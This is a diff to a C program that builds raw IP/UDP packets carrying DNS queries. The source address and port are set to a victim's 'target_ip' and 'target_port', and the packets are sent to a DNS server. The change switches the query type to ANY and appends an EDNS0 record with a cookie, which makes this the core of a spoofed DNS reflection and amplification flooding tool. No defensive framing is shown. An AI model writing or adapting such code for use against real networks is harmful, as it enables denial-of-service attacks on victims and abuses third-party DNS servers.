@@ -25,17 +25,7 @@ unsigned short csum(unsigned short *, int);
 typedef struct
 {
 	unsigned short id; 		// ID
-	// unsigned short flags;	// DNS Flags
-    unsigned char rd : 1;
-    unsigned char tc : 1;
-    unsigned char aa : 1;
-    unsigned char opcode : 4;
-    unsigned char qr : 1;
-    unsigned char rcode : 4;
-    unsigned char cd : 1;
-    unsigned char ad : 1;
-    unsigned char z : 1;
-    unsigned char ra : 1;
+	unsigned short flags;	// DNS Flags
 	unsigned short qcount;	// Question Count
 	unsigned short ans;		// Answer Count
 	unsigned short auth;	// Authority RR
@@ -49,8 +39,20 @@ typedef struct
 	unsigned short qclass;
 }query;
 
-// extended dns
-unsigned char EXT[] = {0x00, 0x00, 0x29, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x0a, 0x00, 0x08, 0x74, 0xbf, 0x3e, 0x69, 0xd1, 0x29, 0x23, 0xc6};
+// ext
+typedef struct
+{
+    unsigned char name;
+    unsigned short opt;
+    unsigned short size;
+    unsigned char rcode;
+    unsigned char version;
+    unsigned short z;
+    unsigned short length;
+    unsigned short opcode;
+    unsigned short oplength;
+    unsigned char cookie[8];
+}ext;
 
 int main(int argc, char **argv){
     /* check all setting are done */
@@ -79,39 +81,37 @@ void dns_send(char *target_ip, int target_port, char *dns_ip, int dns_port){
     memset(packet, 0, 4096);
     iphdr *ip = (iphdr *)packet; // ip header struct
     udphdr *udp = (udphdr *)(packet + sizeof(iphdr)); // udp header struct
-    unsigned char dns_data[256]; // dns data(header + content)
+    unsigned char dns_data[128]; // dns data(header + content)
     // dns
     dnshdr *dns = (dnshdr *)&dns_data;
     dns->id = (unsigned short) htons(0x6652);
-    dns->qr = 0;
-    dns->opcode = 0;
-    dns->aa = 0;
-    dns->tc = 0;
-    dns->rd = 1;
-    dns->ra = 0;
-    dns->z = 0;
-    dns->ad = 0;
-    dns->cd = 0;
-    dns->rcode = 0;
+    dns->flags = 0x2001;
     dns->qcount = htons(1);
     dns->ans = 0;
     dns->auth = 0;
-    dns->add = 0;
+    dns->add = 0x0100;
 
     unsigned char *dns_name, url[32];
     dns_name = (unsigned char *)&dns_data[sizeof(dnshdr)];
-    strcpy(url, URL2);
+    strcpy(url, URL4);
     dns_format(dns_name, url);
 
     query *q = (query *)&dns_data[sizeof(dnshdr) + strlen(dns_name) + 1];
-    q->qtype = htons(16); //28: AAAA
+    q->qtype = htons(0xff); //28: AAAA
     q->qclass = htons(1);
-
-    unsigned char *ext = dns_data + sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query);
-    memcpy(dns_data + sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query) , EXT, sizeof(EXT));
+    ext *e = (ext *)&dns_data[sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query)]; 
+    e->name = 0;
+    e->opt = 0x1029;
+    e->size = 0;
+    e->rcode = 0;
+    e->version = 0;
+    e->z = 0;
+    e->length = 12;
+    e->opcode = 10;
+    e->oplength = 8;
 
     char *data = packet + sizeof(iphdr) + sizeof(udphdr);
-    memcpy(data, &dns_data, sizeof(dnshdr) + strlen(dns_name) + sizeof(query) + 1 + sizeof(EXT));
+    memcpy(data, &dns_data, sizeof(dnshdr) + strlen(dns_name) + 1 + sizeof(query) + sizeof(ext));
     // ip header
     ip->ihl = 5;
     ip->version = 4;
@@ -122,7 +122,7 @@ void dns_send(char *target_ip, int target_port, char *dns_ip, int dns_port){
     ip->ttl = 128;
     ip->saddr = inet_addr(target_ip);
     ip->daddr = sin.sin_addr.s_addr;
-    ip->tot_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query) + sizeof(EXT);
+    ip->tot_len = sizeof(iphdr) + sizeof(udphdr) + sizeof(dnshdr) + (strlen(dns_name) + 1) + sizeof(query) + sizeof(ext);
     ip->check = csum((unsigned short *)packet, ip->tot_len);
     // udp header
     udp->source = htons(target_port);
